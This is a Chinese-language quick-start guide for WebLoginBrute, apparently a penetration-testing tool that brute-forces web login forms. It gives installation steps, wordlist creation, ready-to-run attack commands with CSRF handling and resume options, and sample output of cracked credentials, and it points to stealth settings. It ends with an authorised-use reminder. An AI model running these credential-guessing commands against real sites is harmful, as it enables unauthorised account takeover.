# 快速开始

**版本：0.27.1**

本指南将帮助你在5分钟内快速上手 WebLoginBrute，完成第一次 Web 登录暴力破解。

## 安装

### 1. 克隆项目

```bash
git clone https://github.com/your-repo/WebLoginBrute.git
cd WebLoginBrute
```

### 2. 安装依赖

```bash
pip install -r requirements.txt
```

### 3. 验证安装

```bash
python -m webloginbrute -V
```

应该显示：`webloginbrute 0.27.1`

## 准备字典文件

创建简单的测试字典：

```bash
# 创建用户名字典
echo -e "admin\nuser\ntest" > users.txt

# 创建密码字典
echo -e "password\n123456\nadmin" > passwords.txt
```

## 基本使用

### 方式一：命令行参数（推荐新手）

```bash
python -m webloginbrute \
  -u https://target.com/login \
  -a https://target.com/login \
  -U users.txt \
  -P passwords.txt \
  -t 5 \
  -v
```

### 方式二：配置文件（推荐复杂场景）

1. 创建配置文件：

```yaml
# config.yaml
url: "https://target.com/login"
action: "https://target.com/login"
users: "users.txt"
passwords: "passwords.txt"
threads: 5
verbose: true
```

2. 运行程序：

```bash
python -m webloginbrute --config config.yaml
```

## 参数说明

### 必需参数
- `-u, --url`: 登录表单页面URL
- `-a, --action`: 登录表单提交URL
- `-U, --users`: 用户名字典文件
- `-P, --passwords`: 密码字典文件

### 常用可选参数
- `-t, --threads`: 并发线程数（默认：5）
- `-v, --verbose`: 详细输出
- `-s, --csrf`: CSRF token字段名
- `-r, --resume`: 断点续扫

## 实战示例

### 示例1：基础爆破

```bash
python -m webloginbrute \
  -u http://192.168.1.100/login.php \
  -a http://192.168.1.100/login.php \
  -U users.txt \
  -P passwords.txt \
  -t 10 \
  -v
```

### 示例2：带CSRF Token

```bash
python -m webloginbrute \
  -u https://example.com/login \
  -a https://example.com/login \
  -U users.txt \
  -P passwords.txt \
  -s csrf_token \
  -t 5 \
  -v
```

### 示例3：断点续扫

```bash
# 第一次运行
python -m webloginbrute \
  -u https://target.com/login \
  -a https://target.com/login \
  -U users.txt \
  -P passwords.txt \
  -t 10

# 中断后继续
python -m webloginbrute \
  -u https://target.com/login \
  -a https://target.com/login \
  -U users.txt \
  -P passwords.txt \
  -t 10 \
  -r
```

## 输出解读

### 成功登录
```
2024-01-01 12:00:00 - INFO - 登录成功: admin:password
```

### 进度信息
```
2024-01-01 12:00:00 - INFO - 开始暴力破解，总共 9 个组合
2024-01-01 12:00:00 - INFO - 过滤后剩余 9 个组合
```

### 统计报告
```
==================================================
暴力破解完成
==================================================
总尝试次数: 9
成功次数: 1
超时错误: 0
连接错误: 0
HTTP错误: 0
其他错误: 0
重试次数: 0
频率限制: 0
验证码检测: 0
总耗时: 5.23 秒
平均响应时间: 0.581 秒
==================================================
```

## 常见问题

### Q: 提示"文件不存在"
A: 检查字典文件路径是否正确，确保文件存在且有读取权限。

### Q: 提示"URL必须以http://或https://开头"
A: 确保URL包含协议前缀，如 `https://` 或 `http://`。

### Q: 没有找到登录成功
A: 检查URL是否正确，确认表单字段名是否匹配。

### Q: 程序运行很慢
A: 可以增加线程数 `-t 10`，或检查网络连接。

## 下一步

- 学习 [**配置详解**](Configuration.md) 了解所有参数
- 了解 [**对抗级别**](Aggression-Levels.md) 提高隐蔽性
- 掌握 [**高级功能**](Advanced-Features.md) 如断点续扫
- 查看 [**故障排除**](Troubleshooting.md) 解决常见问题

## 安全提醒

- 仅对授权的目标进行测试
- 遵守当地法律法规
- 不要用于非法用途
- 测试完成后及时清理进度文件 